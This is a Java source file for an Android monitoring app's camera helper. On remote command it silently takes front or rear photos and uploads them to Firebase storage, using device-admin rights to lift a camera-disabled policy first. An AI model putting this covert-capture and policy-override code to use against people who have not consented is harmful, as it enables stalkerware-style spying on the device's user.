package com.childmonitorai.helpers;

import android.content.ComponentName;
import android.content.Context;
import android.app.admin.DevicePolicyManager;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.Looper;
import android.os.Process;
import android.provider.Settings;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.childmonitorai.database.FirebaseStorageHelper;
import com.childmonitorai.services.DeviceAdminReceiverService;

import java.nio.ByteBuffer;
import java.util.Collections;
import java.util.concurrent.atomic.AtomicBoolean;

public class CameraHelper {
    private static final String TAG = "CameraHelper";
    private final Context context;
    private final String userId;
    private final String deviceId;
    private final FirebaseStorageHelper storageHelper;
    private final CommandStatusUpdater statusUpdater;

    public interface CommandStatusUpdater {
        void updateStatus(String date, String timestamp, String status, String result);
    }

    public CameraHelper(Context context, String userId, String deviceId, FirebaseStorageHelper storageHelper, CommandStatusUpdater statusUpdater) {
        this.context = context;
        this.userId = userId;
        this.deviceId = deviceId;
        this.storageHelper = storageHelper;
        this.statusUpdater = statusUpdater;
    }

    public void takePicture(String date, String timestamp, String cameraType, boolean useFlash) {
        if (!checkCameraPermissionAndAvailability(date, timestamp)) {
            return;
        }

        Handler mainHandler = new Handler(Looper.getMainLooper());
        mainHandler.post(() -> {
            try {
                CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                String cameraId = getCameraId(cameraManager, cameraType);
                if (cameraId == null) {
                    statusUpdater.updateStatus(date, timestamp, "failed", "Requested camera not available");
                    return;
                }

                if (!isCameraAvailable(cameraManager, cameraId, date, timestamp)) {
                    return;
                }

                ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);
                openCamera(cameraManager, cameraId, reader, useFlash, date, timestamp);

            } catch (Exception e) {
                Log.e(TAG, "Error in takePicture", e);
                statusUpdater.updateStatus(date, timestamp, "failed", "Error: " + e.getMessage());
            }
        });
    }

    private void openCamera(CameraManager cameraManager, String cameraId, ImageReader reader, boolean useFlash, 
                          String date, String timestamp) {
        try {
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA) != 
                PackageManager.PERMISSION_GRANTED) {
                statusUpdater.updateStatus(date, timestamp, "failed", "Camera permission not granted");
                return;
            }

            AtomicBoolean cameraOpened = new AtomicBoolean(false);
            cameraManager.openCamera(cameraId, createStateCallback(cameraOpened, reader, useFlash, date, timestamp), 
                                  new Handler(Looper.getMainLooper()));
        } catch (Exception e) {
            Log.e(TAG, "Error opening camera", e);
            statusUpdater.updateStatus(date, timestamp, "failed", "Error opening camera: " + e.getMessage());
        }
    }

    private CameraDevice.StateCallback createStateCallback(AtomicBoolean cameraOpened, ImageReader reader, 
            boolean useFlash, String date, String timestamp) {
        return new CameraDevice.StateCallback() {
            @Override
            public void onOpened(@NonNull CameraDevice camera) {
                try {
                    cameraOpened.set(true);
                    Log.d(TAG, "Camera opened successfully");
                    createCaptureSession(camera, reader, useFlash, date, timestamp);
                } catch (CameraAccessException e) {
                    Log.e(TAG, "Failed to create capture session", e);
                    statusUpdater.updateStatus(date, timestamp, "failed", 
                            "Failed to create capture session: " + e.getMessage());
                    camera.close();
                }
            }

            @Override
            public void onDisconnected(@NonNull CameraDevice camera) {
                Log.d(TAG, "Camera disconnected");
                camera.close();
                statusUpdater.updateStatus(date, timestamp, "failed", "Camera disconnected");
            }

            @Override
            public void onError(@NonNull CameraDevice camera, int error) {
                String errorMessage = getCameraErrorMessage(error);
                Log.e(TAG, "Camera error: " + errorMessage);
                camera.close();
                statusUpdater.updateStatus(date, timestamp, "failed", "Camera error: " + errorMessage);
            }
        };
    }

    private void createCaptureSession(CameraDevice camera, ImageReader reader, boolean useFlash,
            String date, String timestamp) throws CameraAccessException {
        CaptureRequest.Builder captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
        captureBuilder.addTarget(reader.getSurface());

        // Configure capture settings
        captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
        captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
        captureBuilder.set(CaptureRequest.JPEG_QUALITY, (byte) 100);

        if (useFlash) {
            captureBuilder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_SINGLE);
        }

        AtomicBoolean imageProcessed = new AtomicBoolean(false);
        reader.setOnImageAvailableListener(imageReader -> {
            if (!imageProcessed.get()) {
                try (Image image = imageReader.acquireLatestImage()) {
                    if (image != null) {
                        imageProcessed.set(true);
                        uploadImage(image, camera, reader, date, timestamp);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing image", e);
                    statusUpdater.updateStatus(date, timestamp, "failed", 
                            "Image processing error: " + e.getMessage());
                    releaseCamera(camera, reader);
                }
            }
        }, new Handler(Looper.getMainLooper()));

        camera.createCaptureSession(Collections.singletonList(reader.getSurface()),
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(@NonNull CameraCaptureSession session) {
                        try {
                            session.capture(captureBuilder.build(), null, null);
                        } catch (CameraAccessException e) {
                            statusUpdater.updateStatus(date, timestamp, "failed", 
                                    "Capture failed: " + e.getMessage());
                            camera.close();
                        }
                    }

                    @Override
                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                        statusUpdater.updateStatus(date, timestamp, "failed", 
                                "Failed to configure camera session");
                        camera.close();
                    }
                }, new Handler(Looper.getMainLooper()));
    }

    private boolean isCameraAvailable(CameraManager cameraManager, String cameraId, 
            String date, String timestamp) {
        try {
            // First check if this is a system/root level restriction
            if (isSystemLevelCameraDisabled()) {
                Log.e(TAG, "Camera disabled at system level");
                statusUpdater.updateStatus(date, timestamp, "failed", 
                        "Camera disabled at system level - cannot override");
                return false;
            }

            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(
                    Context.DEVICE_POLICY_SERVICE);
            ComponentName deviceAdmin = new ComponentName(context, DeviceAdminReceiverService.class);
            
            if (dpm != null) {
                if (!dpm.isAdminActive(deviceAdmin)) {
                    Log.e(TAG, "Device admin not activated");
                    statusUpdater.updateStatus(date, timestamp, "failed", "Device admin access required");
                    return false;
                }

                // Try to temporarily override camera policy
                boolean wasCameraDisabled = dpm.getCameraDisabled(deviceAdmin);
                if (wasCameraDisabled) {
                    try {
                        dpm.setCameraDisabled(deviceAdmin, false);
                        Thread.sleep(500); // Wait for policy to take effect
                        
                        if (dpm.getCameraDisabled(deviceAdmin)) {
                            Log.e(TAG, "Failed to override camera policy");
                            statusUpdater.updateStatus(date, timestamp, "failed", 
                                    "Cannot override camera policy - check device settings");
                            return false;
                        }
                    } catch (SecurityException | InterruptedException e) {
                        Log.e(TAG, "Security exception trying to enable camera", e);
                        statusUpdater.updateStatus(date, timestamp, "failed", 
                                "No permission to override camera policy");
                        return false;
                    }
                }
            }

            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error checking camera availability", e);
            statusUpdater.updateStatus(date, timestamp, "failed", 
                    "Camera check failed: " + e.getMessage());
            return false;
        }
    }

    private boolean isSystemLevelCameraDisabled() {
        try {
            int cameraDisabled = Settings.Secure.getInt(
                context.getContentResolver(),
                "camera_disabled",
                0
            );
            if (cameraDisabled == 1) {
                return true;
            }

            // Check if running as system user
            if (Process.myUid() < Process.FIRST_APPLICATION_UID) {
                String cameraDisabledProp = System.getProperty("persist.camera.disabled");
                return "1".equals(cameraDisabledProp);
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Error checking system camera status", e);
            return false;
        }
    }

    private boolean checkCameraPermissionAndAvailability(String date, String timestamp) {
        if (context == null) {
            statusUpdater.updateStatus(date, timestamp, "failed", "Context is null");
            return false;
        }

        if (ActivityCompat.checkSelfPermission(context, 
                android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            statusUpdater.updateStatus(date, timestamp, "failed", "Camera permission not granted");
            return false;
        }

        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        if (cameraManager == null) {
            statusUpdater.updateStatus(date, timestamp, "failed", "Camera service unavailable");
            return false;
        }

        return true;
    }

    private String getCameraErrorMessage(int error) {
        switch (error) {
            case CameraDevice.StateCallback.ERROR_CAMERA_IN_USE:
                return "Camera is already in use";
            case CameraDevice.StateCallback.ERROR_MAX_CAMERAS_IN_USE:
                return "Maximum number of cameras are already in use";
            case CameraDevice.StateCallback.ERROR_CAMERA_DISABLED:
                return "Camera is disabled";
            case CameraDevice.StateCallback.ERROR_CAMERA_DEVICE:
                return "Camera device error";
            case CameraDevice.StateCallback.ERROR_CAMERA_SERVICE:
                return "Camera service error";
            default:
                return "Unknown camera error: " + error;
        }
    }

    private String getCameraId(CameraManager cameraManager, String cameraType) 
            throws CameraAccessException {
        for (String id : cameraManager.getCameraIdList()) {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
            if (facing != null) {
                if ("front".equals(cameraType) && 
                        facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    return id;
                } else if ("rear".equals(cameraType) && 
                        facing == CameraCharacteristics.LENS_FACING_BACK) {
                    return id;
                }
            }
        }
        return null;
    }

    private void uploadImage(Image image, CameraDevice camera, ImageReader reader, String date, String timestamp) {
        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
        byte[] bytes = new byte[buffer.capacity()];
        buffer.get(bytes);
        
        storageHelper.uploadCapture(userId, deviceId, bytes, date, timestamp,
                new FirebaseStorageHelper.CaptureCallback() {
                    @Override
                    public void onSuccess(String downloadUrl) {
                        statusUpdater.updateStatus(date, timestamp, "completed", downloadUrl);
                        releaseCamera(camera, reader);
                    }

                    @Override
                    public void onFailure(String error) {
                        statusUpdater.updateStatus(date, timestamp, "failed", "Upload failed: " + error);
                        releaseCamera(camera, reader);
                    }
                });
    }

    private void releaseCamera(CameraDevice camera, ImageReader reader) {
        try {
            camera.close();
            reader.close();
        } catch (Exception e) {
            Log.e(TAG, "Error releasing camera resources", e);
        }
    }
}
